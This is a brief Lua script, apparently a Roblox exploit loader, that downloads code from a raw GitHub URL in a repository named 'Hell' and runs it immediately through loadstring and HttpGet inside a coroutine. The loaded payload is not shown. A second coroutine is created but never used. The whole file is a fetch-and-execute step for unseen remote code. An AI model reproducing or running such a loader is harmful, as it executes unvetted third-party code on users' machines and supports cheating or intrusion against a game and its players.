local function runScript(url)
    loadstring(game:HttpGet(url))()
end

local co1 = coroutine.create(runScript)
local co2 = coroutine.create(runScript)

coroutine.resume(co1, "https://raw.githubusercontent.com/PresidentZuyi/Hell/refs/heads/main/D")
